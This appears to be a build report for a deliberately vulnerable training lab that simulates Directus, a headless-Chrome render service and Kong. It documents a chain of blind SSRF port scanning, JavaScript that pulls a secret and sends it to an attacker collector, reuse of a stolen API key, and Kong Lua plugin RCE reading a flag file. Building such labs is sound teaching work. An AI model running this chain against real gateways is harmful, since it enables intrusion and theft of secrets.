# lab-74-shale — SSRF → Headless Chrome → Kong RCE

## Frame

- **Outcome**: lab-74-shale implements the OSWE SSRF lesson chain with all extra miles.
- **Success line**: Blind SSRF via /files/import reaches internal network; port/subnet scanning works via error message differentiation; SSRF → render service executes JS from fetched HTML; JS exfiltrates FLAG_LOCAL from Admin API /secret; stolen API key authenticates /render directly; JS creates Kong pre-function plugin; triggering route executes Lua and returns FLAG_PROOF.
- **Kill line**: None reached.
- **Smallest unit**: Blind SSRF with error message differentiation (ECONNREFUSED/EHOSTUNREACH/FORBIDDEN).
- **Type**: build

## Work

### What was implemented

**New files:**
- `labs/lab-74-shale/state.js` — shared in-memory state (API key constants, Kong services/routes/plugins maps, attacker data)
- `labs/lab-74-shale/network.js` — resolveUrl() maps 172.16.16.x to localhost ports; generates ECONNREFUSED/EHOSTUNREACH for unmapped destinations
- `labs/lab-74-shale/app.js` — entry point starting all 6 services
- `labs/lab-74-shale/services/sims.js` — TCP simulators: pg (5432, sends binary garbage → parse error), redis (6379, sends +PONG → parse error)
- `labs/lab-74-shale/services/files.js` — Directus simulation (port 8055): SSRF entry point at POST /files/import; any successful HTTP connection returns 403 FORBIDDEN; ECONNREFUSED/EHOSTUNREACH errors passed through verbatim; pg/redis cause parse errors
- `labs/lab-74-shale/services/render.js` — URL-to-PDF simulation (port 9000): fetches URL with HeadlessChrome UA, executes JS via Node vm sandbox with fetch polyfill routing through resolveUrl
- `labs/lab-74-shale/services/admin.js` — Kong Admin API (port 8001): GET /, GET /key-auths, GET /secret (FLAG_LOCAL), POST /services+routes+plugins, pre-function plugin stores Lua code
- `labs/lab-74-shale/services/gateway.js` — Kong gateway (port 5000): proxies /files/* /users/* to files service; /render requires apikey; dynamic routes execute pre-function Lua via lua5.3; attacker infrastructure
- `labs/lab-74-shale/Dockerfile`, `entrypoint.sh`, `package.json`, `public/index.html`

**Modified files:**
- `platform/app.py` — added lab-74-shale entry
- `platform/port_registry.json` — added lab-74-shale: 5167
- `hints/lab-74.json`

### Key design decisions

1. **Network simulation**: 172.16.16.x IPs mapped to localhost ports via network.js. No real network configuration needed.
2. **JS sandbox**: Node `vm` module with injected `Promise` and fetch polyfill. Handles async/await in payload HTML. Awaits full JS execution before render service returns response.
3. **SSRF error differentiation**: files.js generates ECONNREFUSED/EHOSTUNREACH directly from resolveUrl result (no actual connection attempt needed for unmapped IPs).
4. **Any HTTP response = FORBIDDEN**: files.js returns 403 "You don't have permission" for any successful HTTP connection (regardless of target status code). This enables port scanning to correctly show open HTTP services.
5. **FLAG_LOCAL access**: GET :8001/secret returns FLAG_LOCAL. Reachable only via SSRF → render → JS exfiltration chain.
6. **FLAG_PROOF access**: Lua plugin `io.popen('cat /flag_proof.txt'):read('*a')` executed via execSync when route is triggered; stdout returned in response.

## Evidence

```
# Port scanning
POST /files/import {"url":"http://172.16.16.4:8055/"} → 403 FORBIDDEN (port open)
POST /files/import {"url":"http://172.16.16.4:9999/"} → ECONNREFUSED (port closed)
POST /files/import {"url":"http://172.16.16.99:8000/"} → EHOSTUNREACH (bad host)
POST /files/import {"url":"http://172.16.16.3:5432/"} → Parse Error (non-HTTP)

# FLAG_LOCAL exfiltration chain
1. Upload payload.html with JS: fetch("http://172.16.16.2:8001/secret") → /attacker/collect
2. POST /files/import {"url":"http://172.16.16.5:9000/api/render?url=http://172.16.16.1:8000/attacker/files/payload.html"}
3. GET /api/attacker/results → ["{\"data\":\"ARENA{test_local}\"}"]

# Stolen API key
GET /render?apikey=SBzrCb94o9JOWALBvDAZLnHo3s90smjC&url=http://... → {"ok":true}

# RCE via Lua plugin
JS creates: POST :8001/services, /routes, /plugins (pre-function with Lua)
GET /supersecret → ARENA{test_proof}

# validate_labs.sh
Summary: 68 PASS, 0 WARN, 0 FAIL
```
